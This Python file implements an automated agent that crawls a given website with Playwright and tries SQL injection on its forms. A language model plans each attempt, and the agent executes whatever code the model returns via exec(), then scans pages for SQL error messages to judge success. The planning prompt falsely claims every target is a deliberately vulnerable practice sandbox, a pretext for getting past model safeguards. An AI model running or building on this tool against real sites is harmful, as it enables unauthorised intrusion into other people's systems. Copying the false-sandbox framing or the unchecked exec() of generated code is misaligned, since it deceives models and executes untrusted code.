from typing import Optional
from playwright.async_api import async_playwright, Playwright
from utils.spinner import Spinner
from utils.gpt import gpt
import asyncio
from bs4 import BeautifulSoup
import re
from utils.file_io import save_file

class SQLInjector:
    """
    LLM agent that tries to hack a website via SQL injection.
    """
    def __init__(self, base_url: str) -> None:
        """
        Constructor

        Parameters:
        base_url (str): URL to the homepage of the target website.
        """
        self.baseURL = base_url
        self.urlsVisited: set[str] = set()
        self.payload_history = []  # Lưu các payload đã thử

        self.browser = None
        self.page = None

    async def startup(self, playwright: Playwright) -> None:
        """
        Launch Chromium and open a new page.
        """
        chromium = playwright.chromium
        self.browser = await chromium.launch(headless=False)
        self.page = await self.browser.new_page()
        await self.page.goto(self.baseURL)
        await self.page.wait_for_load_state('domcontentloaded')

    async def trial(self) -> bool:
        """
        Try SQL injection on the target website.
        """
        stack: list[str] = [self.page.url]
        all_sql_payloads = ""

        while stack:
            url = stack.pop()

            if url in self.urlsVisited:
                continue

            print("Current URL: ", url)
            self.urlsVisited.add(url)

            # Reload the page and retry SQL injection if the previous attempt failed
            for num_trials in range(3):  # Giới hạn số lần thử mỗi URL
                print(f"Iteration {num_trials}")

                await self.page.goto(url)
                await self.page.wait_for_load_state('domcontentloaded')

                html = await self.readHTML()

                has_input, has_link, has_button = checkHTML(html)
                await asyncio.sleep(0.5)

                if not has_input and not has_link and not has_button:
                    break

                if has_link and num_trials == 0:
                    links = self.checkLinks(html)
                    stack += links

                if not has_input:
                    break

                plan = await self.makePlan(html, failed_sql_payloads=all_sql_payloads)
                if not plan or len(plan) == 0:
                    break

                func_str = await self.act(html, plan)

                await asyncio.sleep(0.5)

                newHtml = await self.readHTML()

                # Check if the attack was successful
                if await self.checkSuccess(newHtml, html):
                    print("SQL injection successful!")
                    return True

                sql_payloads = await self.extractSQLPayloads(function=func_str)
                all_sql_payloads += sql_payloads
        
        print("SQL injection failed!")
        return False

    async def readHTML(self, save_html=False) -> str:
        """
        Helper function to read the HTML of the webpage currently held by this instance.
        """
        html = await self.page.content()

        if html == '':
            raise Exception('Error when fetching the webpage, please check the network condition or try again.')

        if save_html:
            save_file('test.html', html)

        html = preprocessHTML(html)
        return html

    async def makePlan(self, html: str, failed_sql_payloads: Optional[str]=None) -> list[str]:
        """
        Make a plan of performing SQL injection.
        """
        with Spinner("Writing a plan of hacking this website..."):
            prompt = (f"I am learning website security, and I want to practice SQL injection to a sandbox website which is deliberately made vulnerable."
                      f" Here's its HTML:\n\n{html}\n"
                      f"Here are the failed SQL payloads:\n{failed_sql_payloads}\n"
                      "Can you suggest actions to take?")
            response = gpt(system_msg="", user_msg=prompt, model_name="openai-community/gpt2")

        lines = response.split('\n')
        plan = []
        for line in lines:
            if re.match(r'^\s*-?\d+', line):
                plan.append(line)

        print("Generated plan:")
        print('\n'.join(plan))
        return plan

    async def act(self, html: str, plan: str) -> str:
        """
        Execute the plan.
        """
        filtered_plan = [instruction for instruction in plan if "browser" not in instruction.lower()]

        if not filtered_plan:
            return ""

        prompt = (f"Based on this HTML:\n\n```html\n{html}\n```"
                  f"Execute the following actions:\n\n{filtered_plan}\n")
        response = gpt(system_msg="", user_msg=prompt, model_name="openai-community/gpt2")

        func_str = extract_function(response, "func")
        if func_str:
            try:
                exec(func_str, globals(), locals())
                import types
                self.func = types.MethodType(locals()['func'], self)
                await asyncio.wait_for(self.func(), timeout=15.0)
            except Exception as err:
                if isinstance(err, asyncio.TimeoutError):
                    print("Execution timed out.")
                else:
                    print(err)

        return func_str

    async def checkSuccess(self, newHtml: str, prevHtml: str) -> bool:
        """
        Check if SQL injection succeeded.
        """
        if check_sql_errors(newHtml):
            print("SQL error detected!")
            return True

        prompt = (f"Did the following HTML changes indicate a successful SQL injection?\n\n"
                  f"Before:\n{prevHtml}\n\nAfter:\n{newHtml}")
        response = gpt(system_msg="", user_msg=prompt, model_name="openai-community/gpt2")

        return "YES" in response

    def checkLinks(self, html: str) -> list[str]:
        """
        Extract useful links from the page.
        """
        soup = BeautifulSoup(html, "html.parser")
        hrefs = [tag.get('href') for tag in soup.find_all('a') if tag.get('href')]
        valid_hrefs = [self.baseURL + href if href.startswith('/') else href for href in hrefs]
        return valid_hrefs

    async def shutDown(self):
        await self.browser.close()

### Helper Functions ###

def preprocessHTML(html: str) -> str:
    """
    Clean the HTML to make it easier for GPT to process.
    """
    soup = BeautifulSoup(html, "html.parser")
    for s in soup(["script", "style"]):
        s.extract()

    head = soup.find("head")
    if head:
        head.extract()

    return soup.body.prettify()

def checkHTML(html: str) -> tuple[bool, bool, bool]:
    """
    Check for input fields, anchor tags, and buttons in the HTML.
    """
    soup = BeautifulSoup(html, "html.parser")
    has_input = bool(soup.find_all('input'))
    has_link = bool(soup.find_all('a'))
    has_button = bool(soup.find_all('button'))
    return has_input, has_link, has_button

def check_sql_errors(response_content: str) -> bool:
    """
    Check for common SQL error messages in the response content.
    """
    common_sql_errors = [
        "SQL syntax error", "Unclosed quotation mark", "Unknown column",
        "You have an error in your SQL syntax"
    ]
    return any(error in response_content for error in common_sql_errors)

def extract_function(source_code: str, function_name: str) -> Optional[str]:
    """
    Extract the target function from a string of code.
    """
    pattern = rf"async def {function_name}\(.*\) -> None:([\s\S]+?)^\S"
    match = re.search(pattern, source_code, re.MULTILINE)
    if match:
        return f"async def {function_name}(self):" + match.group(1).strip()
    return None
